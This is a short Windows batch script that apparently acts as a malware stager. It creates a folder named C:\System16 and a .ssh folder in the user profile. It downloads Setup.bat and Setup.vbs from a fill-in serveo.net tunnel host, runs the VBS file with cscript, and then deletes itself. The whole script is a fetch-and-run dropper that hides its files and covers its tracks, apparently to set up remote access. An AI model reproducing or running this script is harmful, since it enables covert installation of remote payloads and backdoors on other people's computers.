@echo off

mkdir C:\System16\
mkdir %USERPROFILE%\.ssh

curl http://your_hostname.serveo.net/Setup.bat -o C:\System16\Setup.bat
curl http://your_hostname.serveo.net/Setup.vbs -o C:\System16\Setup.vbs

cscript C:\System16\Setup.vbs

Rem ---------------------

del download.bat
exit
